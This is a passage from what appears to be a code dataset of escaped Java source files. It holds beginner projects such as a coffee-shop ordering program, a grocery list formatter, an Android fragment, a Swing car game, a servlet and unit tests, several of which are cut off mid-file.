SwerveModuleCon",
    "/*\n * Copyright (C) 2024 Kayque de Freitas <kayquefreitas08@gmail.com>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\npackage EX4;\n\nimport java.util.ArrayList;\nimport java.util.Locale;\nimport java.util.Scanner;\nimport EX4.Cafe;\n\n/**\n * @author Gustavo Rezende <gustavorezendegabriel@hotmail.com>\n * @author Kayque de Freitas <kayquefreitas08@gmail.com>\n * @data 01/04/2024\n * @brief Class main\n */\npublic class main {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        Locale.setDefault(Locale.US);\n\n        boolean teste = true;\n        int controle, opcao, quantidade = 0;\n        String nome;\n        double valor, total = 0;\n        String opcao1;\n\n        ArrayList<Cafe> produto = new ArrayList<>();\n        produto.add(new Cafe(\"cafe expresso\", 0.75));\n        produto.add(new Cafe(\"cafe capuccino\", 1));\n        produto.add(new Cafe(\"leite com cafe\", 1.25));\n\n        do {\n            System.out.println(\"Deseja adicionar um produto?(s/n)\");\n            opcao1 = ler.next();\n\n            if (opcao1.equals(\"s\")) {\n                System.out.println(\"Qual o nome do produto?\");\n                ler.nextLine();\n                nome = ler.nextLine();\n                System.out.println(\"Qual o valor do produto?\");\n                valor = ler.nextDouble();\n                produto.add(new Cafe(nome, valor));\n                continue;\n            } else if (opcao1.equals(\"n\")) {\n                teste = false;\n                break;\n            } else {\n                System.out.println(\"Opcao invalida\");\n                continue;\n            }\n        } while (teste);\n\n        teste = true;\n\n        do {\n            controle = 0;\n            System.out.println(\"Forneca uma opcao:\");\n            for (Cafe i : produto) {\n\n                System.out.println((controle) + \" - \" + produto.get(controle).getNome());\n                controle++;\n\n            }\n            System.out.println((controle) + \" - Saida\");\n            opcao = ler.nextInt();\n\n            if (opcao > controle) {\n                System.out.println(\"Opcao invalida\");\n                continue;\n            } else if (opcao == controle) {\n                teste = false;\n                break;\n            } else {\n                produto.get(opcao).addCafe();\n                continue;\n            }\n\n        } while (teste);\n\n        teste = true;\n\n        do{\n            System.out.println(\"Deseja remover um produto?(s/n)\");\n            opcao1 = ler.next();\n\n            if (opcao1.equals(\"s\")) {\n                System.out.println(\"Qual o produto?\");\n                controle = 0;\n                for (Cafe a : produto) {\n\n                    System.out.println((controle) + \" - \" + produto.get(controle).getNome());\n                    controle++;\n                }\n\n                opcao = ler.nextInt();\n                produto.get(opcao).removerCafe();\n                continue;\n            } else if (opcao1.equals(\"n\")) {\n                teste = false;\n                break;\n            } else {\n                System.out.println(\"Opcao invalida\");\n                continue;\n            }\n\n        } while (teste);\n\n        controle = 0;\n        for (Cafe e : produto) {\n            System.out.println(\"Qde \"+produto.get(controle).getNome()+\" \"+produto.get(controle).getQuantidade()+\" - Valor \"+produto.get(controle).total());\n            controle++;\n        }\n        \n        controle = 0;\n        for (Cafe e : produto) {\n            \n            total += produto.get(controle).total();\n            quantidade += produto.get(controle).getQuantidade();\n            controle++;\n        }\n\n        System.out.printf(\"\\nQde cafes vendidos: %d, valor cafes vendido: %.2f\", quantidade, total);\n\n        System.out.println(\"\");\n        System.out.println(\"    Como deseja pagar? \");\n        System.out.println(\"1 - Deseja pagar parcialmente\");\n        System.out.println(\"2 - Deseja pagar tudo\");\n        int pgt_client = ler.nextInt();\n        //Bloco para ver quanto que foi pago, quanto que est\u00e1 devendo, troco do cliente\n        double tConta = total;\n        \n        switch (pgt_client) {\n            \n            case 1:\n                System.out.println(\"Qual o valor que deseja pagar? \");\n                double pgt_prc = ler.nextDouble();\n                tConta = tConta - pgt_prc;\n\n                if (tConta == 0) {\n\n                    Syste",
    "package org.example;\n\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        String line;\n        Double sum= (double) 0;\n        String filepath = \"C:\\\\Users\\\\86185\\\\Desktop\\\\Groceries.txt\";\n        String writerpath=\"C:\\\\Users\\\\86185\\\\Desktop\\\\GroceriesFormatted.txt\";\n        FileReader  fileReader = new FileReader(filepath);\n        BufferedReader reader = new BufferedReader(fileReader);\n        FileWriter fileWriter=new FileWriter(writerpath);\n        BufferedWriter writer=new BufferedWriter(fileWriter);\n        writer.write(\"****************************************************\\n\");\n        writer.write(\"ID#        Item                   Quantity        Price (\u20ac)\\n\");\n        while((line=reader.readLine())!=null){\n            System.out.println(line);\n            String [] a=line.split(\",\");\n            Double price= Double.valueOf(a[3]);\n            String id=a[0];\n            String item=a[1];\n            String quantity=a[2];\n            sum+=price;\n            writer.write(id+\"\\t\\t\"+item+ \"\\t\\t\" +quantity+\"\\t\\t\"+price+'\\n');\n        }\n        writer.write(\"****************************************************\\n\");\n\n        String format = String.format(\"%.2f\", sum);\n        System.out.println(\"Total price:\"+format);\n        writer.write(\"The grocery shopping total is: \u20ac\"+format);\n        writer.write(\"\\n****************************************************\\n\");\n        reader.close();\n        writer.flush();\n        writer.close();\n    }\n}\n",
    "package com.example.navdrawerexample.fragments;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.ArrayAdapter;\nimport android.widget.ListView;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.Fragment;\n\nimport com.example.navdrawerexample.R;\n\npublic class SateliteFragment extends Fragment {\n\n    private ListView listViewSatelite;\n\n    public SateliteFragment() {\n        // Required empty public constructor\n    }\n\n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        View rootView = inflater.inflate(R.layout.fragment_satelite, container, false);\n\n        // Initialize ListView\n        listViewSatelite = rootView.findViewById(R.id.listViewMapel);\n\n        // Create an array of student names\n        String[] mapelNames = {\"Moon\", \"Callisto\", \"Galileo\", \"Dimorphos\", \"Enceladus\"};\n\n        // Create an ArrayAdapter to populate the ListView\n        ArrayAdapter<String> adapter = new ArrayAdapter<>(requireContext(), android.R.layout.simple_list_item_1, mapelNames);\n\n        // Set the adapter to the ListView\n        listViewSatelite.setAdapter(adapter);\n\n        return rootView;\n    }\n\n    @Override\n    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n        // Set the title of the Fragment\n        requireActivity().setTitle(\"Satelite Fragment\");\n    }\n}\n",
    "package com.AppRH.AppRH.models;\n\nimport java.util.List;\nimport javax.persistence.CascadeType;\nimport javax.persistence.Entity;\nimport javax.persistence.GeneratedValue;\nimport javax.persistence.GenerationType;\nimport javax.persistence.Id;\nimport javax.persistence.ManyToOne;\nimport javax.persistence.OneToMany;\n\n\n@Entity\npublic class Funcionario {\n\t\t\n\t@Id\n\t@GeneratedValue(strategy = GenerationType.IDENTITY)\n\tprivate long id;\n\t\n\tprivate String nome;\n\tprivate String data;\n\tprivate String email;\n\t\n\t@OneToMany(mappedBy = \"funcionario\", cascade = CascadeType.REMOVE)\n\tprivate List<Dependente>dependentes;\n\t\n\t@ManyToOne\n\tprivate Empresa empresa;\n\n\tpublic long getId() {\n\t\treturn id;\n\t}\n\n\tpublic void setId(long id) {\n\t\tthis.id = id;\n\t}\n\n\tpublic String getNome() {\n\t\treturn nome;\n\t}\n\n\tpublic void setNome(String nome) {\n\t\tthis.nome = nome;\n\t}\n\n\tpublic String getData() {\n\t\treturn data;\n\t}\n\n\tpublic void setData(String data) {\n\t\tthis.data = data;\n\t}\n\n\tpublic String getEmail() {\n\t\treturn email;\n\t}\n\n\tpublic void setEmail(String email) {\n\t\tthis.email = email;\n\t}\n\n\tpublic List<Dependente> getDependentes() {\n\t\treturn dependentes;\n\t}\n\n\tpublic void setDependentes(List<Dependente> dependentes) {\n\t\tthis.dependentes = dependentes;\n\t}\n\n\tpublic Empresa getEmpresa() {\n\t\treturn empresa;\n\t}\n\n\tpublic void setEmpresa(Empresa empresa) {\n\t\tthis.empresa = empresa;\n\t}\n\n\t\n}\n",
    "import java.awt.Color;\r\nimport java.awt.Font;\r\nimport java.awt.Graphics;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.KeyEvent;\r\nimport java.awt.event.KeyListener;\r\nimport java.io.IOException;\r\nimport java.util.Random;\r\nimport java.util.concurrent.TimeUnit;\r\nimport javax.imageio.ImageIO;\r\nimport javax.swing.ImageIcon;\r\nimport javax.swing.JFrame;\r\nimport javax.swing.Timer;\r\n\r\n\r\n\r\nclass CarGame extends JFrame implements KeyListener,ActionListener\r\n{\r\n\r\n\tprivate int xpos=300; \r\n\tprivate int ypos=700; \r\n\tprivate ImageIcon car; \r\n\tprivate Timer timer; \r\n\tRandom random=new Random(); \r\n\t\r\n\tprivate int num1=400,num2=0,num3=0; \r\n\tprivate int tree1ypos=400,tree2ypos=-200,tree3ypos=-500,tree4ypos=100,tree5ypos=-300,tree6ypos=500;  \r\n\tprivate int roadmove=0; \r\n\tprivate int carxpos[]={100,200,300,400,500}; \r\n\tprivate int carypos[]= {-240,-480,-720,-960,-1200}; \r\n\tprivate int cxpos1=0,cxpos2=2,cxpos3=4; \r\n\tprivate int cypos1=random.nextInt(5),cypos2=random.nextInt(5),cypos3=random.nextInt(5);\r\n\tint y1pos=carypos[cypos1],y2pos=carypos[cypos2],y3pos=carypos[cypos3];\r\n\tprivate ImageIcon car1,car2,car3;\r\n\tprivate int score=0,delay=100,speed=90; \r\n\tprivate ImageIcon tree1,tree2,tree3; \r\n\tprivate boolean rightrotate=false,gameover=false,paint=false; \r\n\t\r\n\t\r\n\tpublic CarGame(String title)\r\n\t{\r\n\t\tsuper(title);\r\n\t\tsetBounds(300,10,700,700);\r\n\t\tsetVisible(true);\r\n\t\tsetDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n\t\tsetLayout(null); \r\n\t\taddKeyListener(this); \r\n\t\tsetFocusable(true); \r\n\t\tsetResizable(false); \r\n\t\t\r\n\t}\r\n\r\n\t\r\n\tpublic void paint(Graphics g)\r\n\t{\r\n\t\tg.setColor(new Color(0X82CD47)); \r\n\t\tg.fillRect(0, 0, 700, 700); \r\n\t\tg.setColor(new Color(0X9F8772)); \r\n\t\tg.fillRect(90,0,10,700); \r\n\t\tg.fillRect(600, 0, 10, 700); \r\n\t\tg.fillRect(100, 0, 500, 700);\r\n\t\t\r\n\t\r\n\tif(roadmove==0)\r\n\t{\r\n\t\tfor(int i=0; i<=700; i+=100) \r\n\t\t{ \t\r\n\t\t\tg.setColor(Color.white);\r\n\t\t\tg.fillRect(350, i,10, 70); \r\n\t\r\n\t\t}\r\n\t\troadmove=1;\r\n\t}\r\n\telse if(roadmove==1)\r\n\t{\r\n\t\tfor(int i=50; i<=700; i+=100)\r\n\t\t{\r\n\t\t\tg.setColor(Color.white);\r\n\t\t\tg.fillRect(350, i,10, 70);\r\n\t\t}\r\n\t\troadmove=0; \r\n\t}\r\n\t\r\n\ttry {\r\n\t\ttree1=new ImageIcon(ImageIO.read(getClass().getResource(\"tree.png\"))); \r\n\t} catch (IOException e) {\r\n\t\te.printStackTrace();\r\n\t}\r\n\t\r\n\ttry {\r\n\t\ttree2=new ImageIcon(ImageIO.read(getClass().getResource(\"tree.png\")));\r\n\t} catch (IOException e) {\r\n\t\te.printStackTrace();\r\n\t}\r\n\r\n\ttry {\r\n\t\ttree3=new ImageIcon(ImageIO.read(getClass().getResource(\"tree.png\")));\r\n\t} catch (IOException e) {\r\n\t\te.printStackTrace();\r\n\t}\r\n\r\n\ttree1.paintIcon(this, g, 0, tree1ypos); \r\n\tnum1=random.nextInt(500); \r\n\ttree1ypos+=50; \r\n\t\r\n\ttree2.paintIcon(this, g, 0,tree2ypos ); \r\n\ttree2ypos+=50; \r\n\t\r\n\ttree3.paintIcon(this,g,0,tree3ypos); \r\n\ttree3ypos+=50; \r\n\ttree1.paintIcon(this,g,600,tree4ypos);\r\n\ttree4ypos+=50;\r\n\ttree3.paintIcon(this, g,600,tree5ypos);\r\n\ttree5ypos+=50;\r\n\ttree2.paintIcon(this, g,600,tree6ypos);\r\n\ttree6ypos+=50;\r\n\t\r\n\t\t\r\n\tif(tree1ypos>700)\r\n\t{\r\n\t\tnum1=random.nextInt(500); \r\n\t\ttree1ypos=-num1; \r\n\t}\r\n\tif(tree2ypos>700)\r\n\t{ \r\n\t\tnum1=random.nextInt(500);\r\n\t\ttree2ypos=-num1;\r\n\t}\r\n\tif(tree3ypos>700)\r\n\t{\r\n\t\tnum1=random.nextInt(500);\r\n\t\ttree3ypos=-num1;\r\n\t}\r\n\tif(tree4ypos>700)\r\n\t{ \r\n\t\tnum1=random.nextInt(500);\r\n\t\ttree4ypos=-num1;\r\n\t}\r\n\tif(tree5ypos>700)\r\n\t{\r\n\t\tnum1=random.nextInt(500);\r\n\t\ttree5ypos=-num1;\r\n\t}\r\n\tif(tree6ypos>700)\r\n\t{ \r\n\t\tnum1=random.nextInt(500);\r\n\t\ttree6ypos=-num1;\r\n\t}\r\n\t\r\n\t\r\n\t\t\r\n\t\ttry {\r\n\t\t\tcar=new ImageIcon(ImageIO.read(getClass().getResource(\"gamecar3.png\"))); \r\n\t\t} catch (IOException e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\r\n\t\t\r\n\t\tcar.paintIcon(this,g,xpos,ypos); \r\n\t\t\r\n\t\typos-=40;\r\n\t\tif(ypos<500)\r\n\t\t{\r\n\t\typos=500;\t\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\ttry {\r\n\t\t\tcar1=new ImageIcon(ImageIO.read(getClass().getResource(\"gamecar1.png\")));\r\n\t\t} catch (IOException e) {\r\n\t\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\ttry {\r\n\t\t\tcar2=new ImageIcon(ImageIO.read(getClass().getResource(\"gamecar2.png\")));\r\n\t\t} catch (IOException e) {\r\n\t\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\ttry {\r\n\t\t\tcar3=new ImageIcon(ImageIO.read(getClass().getResource(\"gamecar4.png\")));\r\n\t\t} catch (IOException e) {\r\n\t\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\tcar1.paintIcon(this, g, carxpos[cxpos1], y1pos);\r\n\t\tcar2.paintIcon(this, g, carxpos[cxpos2], y2pos); \r\n\t\tcar3.paintIcon(this, g, carxpos[cxpos3], y3pos);\r\n\t\ty1pos+=50;\r\n\t\ty2pos+=50;\r\n\t\ty3pos+=50;\r\n\t\tif(y1pos>700)\r\n\t\t{ \r\n\t\t\tcxpos1=random.nextInt(5);\r\n\t\t\tcypos1=random.nextInt(5); \t\r\n\t\t\ty1pos=carypos[cypos1];\r\n\t\t\t\r\n\t\t}\r\n\t\tif(y2pos>700)\r\n\t\t{\r\n\t\t\tcxpos2++;\r\n\t\t\tif(cxpos2>4)\r\n\t\t\t{ \r\n\t\t\t\tcxpos2=0; \r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tcxpos2=random.nextInt(5);\r\n\t\t\tcypos2=random.nextInt(5);\r\n\t\t\ty2pos=carypos[cypos2];\r\n\t\t\t\r\n\t\t}\r\n\t\tif(y3pos>700)\r\n\t\t{\r\n\t\t\tcxpos3++;\r\n\t\t\tif(cxpos3>4)\r\n\t\t\t{\r\n\t\t\t\tcxpos3=0;\r\n\t\t\t}\r\n\t\t\tcxpos3=random.nextInt(5);\r\n\t\t\tcypos3=random.nextInt(5);\r\n\t\t\ty3pos=carypos[cypos3];\r\n\t\t}\r\n\t\r\n\t\tif(cxpos1==cxpos2 && cypos1>-100 && cypos2>-100)\r\n\t\t{ \r\n\t\t\tcxpos1-=1;\r\n\t\t\tif(cxpos1<0)\r\n\t\t\t{\r\n\t\t\t\tcxpos1+=2;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(cxpos1==cxpos3&& cypos1>-100 && cypos3>-100)\r\n\t\t{\r\n\t\t\tcxpos3-=1;\r\n",
    "import java.util.ArrayList;\nimport java.util.Collections;\n\npublic class JavaVectores {\n    public static void main(String[] args) {\n        // 1. Declarar una lista vac\u00eda\n        ArrayList<String> listaVacia = new ArrayList<>();\n\n        // 2. Declarar una lista con m\u00e1s de 5 elementos\n        ArrayList<String> listaConMasDe5 = new ArrayList<>();\n        listaConMasDe5.add(\"Elemento1\");\n        listaConMasDe5.add(\"Elemento2\");\n        listaConMasDe5.add(\"Elemento3\");\n        listaConMasDe5.add(\"Elemento4\");\n        listaConMasDe5.add(\"Elemento5\");\n        listaConMasDe5.add(\"Elemento6\");\n\n        // 3. Encuentre la longitud de las dos listas creadas anteriormente\n        System.out.println(\"Longitud de listaVacia: \" + listaVacia.size());\n        System.out.println(\"Longitud de listaConMasDe5: \" + listaConMasDe5.size());\n\n        // 4. Obtener el primer elemento, el elemento central y el \u00faltimo elemento de la lista\n        System.out.println(\"Primer elemento de listaConMasDe5: \" + listaConMasDe5.get(0));\n        System.out.println(\"Elemento central de listaConMasDe5: \" + listaConMasDe5.get(listaConMasDe5.size() / 2));\n        System.out.println(\"\u00daltimo elemento de listaConMasDe5: \" + listaConMasDe5.get(listaConMasDe5.size() - 1));\n\n        // 5. Crear una lista llamada Datos_personales que contenga (nombre, edad, altura, estado civil, direcci\u00f3n), y agrega datos utilizando la funcion append()\n        ArrayList<String> datosPersonales = new ArrayList<>();\n        datosPersonales.add(\"Juan\"); // Nombre\n        datosPersonales.add(\"30\"); // Edad\n        datosPersonales.add(\"1.75\"); // Altura\n        datosPersonales.add(\"Soltero\"); // Estado civil\n        datosPersonales.add(\"Calle Falsa 123\"); // Direcci\u00f3n\n\n        // 6. Crea una lista llamada it_companies y as\u00edgnele los valores iniciales Facebook, Google, Microsoft, Apple, IBM, Oracle y Amazon\n        ArrayList<String> itCompanies = new ArrayList<>();\n        itCompanies.add(\"Facebook\");\n        itCompanies.add(\"Google\");\n        itCompanies.add(\"Microsoft\");\n        itCompanies.add(\"Apple\");\n        itCompanies.add(\"IBM\");\n        itCompanies.add(\"Oracle\");\n        itCompanies.add(\"Amazon\");\n\n        // 7. A\u00f1adir una empresa a la lista it_companies utilizando la funcion insert()\n        itCompanies.add(1, \"Twitter\");\n\n        // 8. Comprobar si una determinada empresa existe en la lista it_companies\n        String empresaBuscada = \"Microsoft\";\n        if (itCompanies.contains(empresaBuscada)) {\n            System.out.println(empresaBuscada + \" existe en la lista.\");\n        } else {\n            System.out.println(empresaBuscada + \" no existe en la lista.\");\n        }\n\n        // 9. Ordena la lista con el m\u00e9todo sort()\n        Collections.sort(itCompanies);\n\n        // 10. Invierte la lista en orden descendente utilizando el m\u00e9todo reverse()\n        Collections.reverse(itCompanies);\n\n        // 11. Elimine la primera empresa inform\u00e1tica de la lista utilizando el m\u00e9todo pop y delete\n        String primeraEmpresa = itCompanies.remove(0);\n        System.out.println(\"Se elimin\u00f3 la primera empresa: \" + primeraEmpresa);\n\n        // 12. Eliminar todas las empresas de la lista it_companies\n        itCompanies.clear();\n    }\n}\n",
    "package servlets;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.RequestDispatcher;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.bittercode.model.UserRole;\nimport com.bittercode.util.StoreUtil;\n//Http Servlet extended class for showing the about information\npublic class AboutServlet extends HttpServlet {\n\n    public void service(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException {\n        PrintWriter pw = res.getWriter();\n        res.setContentType(\"text/html\");\n        //If the store is logged in as customer or seller show about info\n        if (StoreUtil.isLoggedIn(UserRole.CUSTOMER, req.getSession())) {\n            RequestDispatcher rd = req.getRequestDispatcher(\"CustomerHome.html\");\n            rd.include(req, res);\n            StoreUtil.setActiveTab(pw, \"about\");\n            pw.println(\"<iframe src=\\\"https://flowcv.me/shashirajraja\\\" class=\\\"holds-the-iframe\\\"\\r\\n\"\n                    + \"        title=\\\"My Personal Website\\\" width=\\\"100%\\\" height=\\\"100%\\\"></iframe>\");\n\n        } else if (StoreUtil.isLoggedIn(UserRole.SELLER, req.getSession())) {\n            RequestDispatcher rd = req.getRequestDispatcher(\"SellerHome.html\");\n            rd.include(req, res);\n            StoreUtil.setActiveTab(pw, \"about\");\n            pw.println(\"<iframe src=\\\"https://flowcv.me/shashirajraja\\\" class=\\\"holds-the-iframe\\\"\\r\\n\"\n                    + \"        title=\\\"My Personal Website\\\" width=\\\"100%\\\" height=\\\"100%\\\"></iframe>\");\n\n        } else {\n            //If the user is not logged in, ask to login first\n            //Proceed only if logged in or forword to login page\n            RequestDispatcher rd = req.getRequestDispatcher(\"login.html\");\n            rd.include(req, res);\n            pw.println(\"<table class=\\\"tab\\\"><tr><td>Please Login First to Continue!!</td></tr></table>\");\n        }\n\n    }\n\n}\n",
    "import java.util.Scanner;\n\npublic class SafeInput {\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return a String response that is not zero length\n     */\n    public static String getNonZeroLenString(Scanner pipe, String prompt) {\n        String retString = \"\"; // Set this to zero length. Loop runs until it isn\u2019t\n        do {\n            System.out.print(\"\\n\" + prompt + \": \"); // show prompt add space\n            retString = pipe.nextLine();\n        } while (retString.length() == 0);\n        return retString;\n    }\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return an int response that is not a String\n     */\n    public static int getInt(Scanner pipe, String prompt) {\n        int ret = 0;\n        boolean done = false;\n        String trash = \"\";\n\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            if(pipe.hasNextInt()) {\n                ret = pipe.nextInt();\n                pipe.nextLine();\n                done = true;\n            } else {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter a valid number not \" + trash);\n            }\n        }while(!done);\n        return ret;\n    }\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return a double response that is not a String\n     */\n    public static double getDouble(Scanner pipe, String prompt) {\n        double ret = 0.0;\n        boolean done = false;\n        String trash = \"\";\n\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            if(pipe.hasNextDouble()) {\n                ret = pipe.nextDouble();\n                pipe.nextLine();\n                done = true;\n            } else {\n                trash = pipe.nextLine();\n                System.out.println(\"Please enter a valid number not \" + trash);\n            }\n        } while (!done);\n        return ret;\n    }\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return an int response that is between the low and high numbers given\n     */\n    public static int getRangedInt(Scanner pipe, String prompt, int low, int high) {\n        int ret = 0;\n        boolean done = false;\n        String trash = \"\";\n\n        do {\n            System.out.print(prompt + \"[\" + low + \" - \" + high + \"]: \");\n            if (pipe.hasNextInt()) {\n                ret = pipe.nextInt();\n                pipe.nextLine();\n                if (ret >= low && ret <= high) {\n                    done = true;\n                } else {\n                    System.out.println(\"You must enter a value between \" + low + \" and \" + high + \". Not \" + ret);\n                }\n\n            } else {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter a valid number not \" + trash);\n            }\n        } while (!done);\n        return ret;\n    }\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return a double response that is between the low and high numbers given\n     */\n    public static double getRangedDouble(Scanner pipe, String prompt, double low, double high) {\n        double ret = 0.0;\n        boolean done = false;\n        String trash = \"\";\n\n        do {\n            System.out.print(prompt + \"[\" + low + \" - \" + high + \"]: \");\n            if (pipe.hasNextDouble()) {\n                ret = pipe.nextDouble();\n                pipe.nextLine();\n                if (ret >= low && ret <= high) {\n                    done = true;\n                } else {\n                    System.out.println(\"You must enter a value between \" + low + \" and \" + high + \". Not \" + ret);\n                }\n\n            } else {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter a valid number not \" + trash);\n            }\n        } while (!done);\n        return ret;\n    }\n    /**\n     *\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return a boolean response that is true for Y or y and false for N or n\n     */\n    public static boolean getYNConfirm(Scanner pipe, String prompt) {\n        String doneResponse = \"\";\n        boolean done = false;\n        String trash = \"\";\n\n        do {\n            System.out.print(prompt + \"[Y/N]: \");\n            doneResponse = pipe.nextLine();\n\n            if(doneResponse.equalsIgnoreCase(\"N\")||doneResponse.equalsIgnoreCase(\"Y\")) {\n                done = true;\n            }\n            else {\n                trash = doneResponse;\n                System.out.println(\"You must enter a valid answer not \" + trash);\n            }\n        }while(!done);\n        if(doneResponse.equalsIgnoreCase(\"N\")) {\n            done = false;\n        } else {\n            done = true;",
    "package com.powerup.java.immutable.model.builder.validator;\n\nimport org.apache.commons.lang3.StringUtils;\nimport org.junit.jupiter.api.Test;\n\nimport static org.junit.jupiter.api.Assertions.assertDoesNotThrow;\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertThrows;\nimport static org.junit.jupiter.api.Assertions.assertTrue;\n\n@SuppressWarnings(\"SameReturnValue\")\nclass ByteLessThanEqualToBuilderValidatorTest {\n    public static final String PARAMETER_NAME = \"test\";\n    public static final String SHOULD_BE_EMPTY_ERROR_MESSAGE = \"Error message should be empty\";\n\n    @Test\n    public void testConstructor_NominalCase() {\n        assertDoesNotThrow(() -> new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME, ByteLessThanEqualToBuilderValidatorTest::getValidValue,\n                (byte) 1));\n    }\n\n    @Test\n    public void testConstructor_NullSupplier() {\n        assertThrows(IllegalArgumentException.class, () -> new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME, null, (byte) 1));\n    }\n\n    @Test\n    public void testValidate_GreaterThan() {\n        ByteLessThanEqualToBuilderValidator instance = new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME,\n                ByteLessThanEqualToBuilderValidatorTest::getValidValue, (byte) 0);\n        String result = instance.validate();\n        assertEquals(String.format(BuilderValidator.LESS_THAN_EQUAL_TO_ERROR_MESSAGE_FORMAT, PARAMETER_NAME, 0), result);\n    }\n\n    @Test\n    public void testValidate_Equal() {\n        ByteLessThanEqualToBuilderValidator instance = new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME,\n                ByteLessThanEqualToBuilderValidatorTest::getValidValue, (byte) 1);\n        String result = instance.validate();\n        assertTrue(StringUtils.isEmpty(result), SHOULD_BE_EMPTY_ERROR_MESSAGE);\n    }\n\n    @Test\n    public void testValidate_LessThan() {\n        ByteLessThanEqualToBuilderValidator instance = new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME,\n                ByteLessThanEqualToBuilderValidatorTest::getValidValue, (byte) 2);\n        String result = instance.validate();\n        assertTrue(StringUtils.isEmpty(result), SHOULD_BE_EMPTY_ERROR_MESSAGE);\n    }\n\n    @Test\n    public void testValidate_Null() {\n        ByteLessThanEqualToBuilderValidator instance = new ByteLessThanEqualToBuilderValidator(PARAMETER_NAME,\n                ByteLessThanEqualToBuilderValidatorTest::getNullValue, (byte) 2);\n        String result = instance.validate();\n        assertTrue(StringUtils.isEmpty(result), SHOULD_BE_EMPTY_ERROR_MESSAGE);\n    }\n\n    private static Byte getValidValue() {\n        return 1;\n    }\n\n    private static Byte getNullValue() {\n        return null;\n    }\n}",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage projects.java.thread;\n\n/**\n *\n * @author zhuniox\n */\npublic class ThreadIndex extends javax.swing.JFrame {\n\n    /**\n     * Creates new form ThreadMain\n     */\n    public ThreadIndex() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 810, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 610, Short.MAX_VALUE)\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            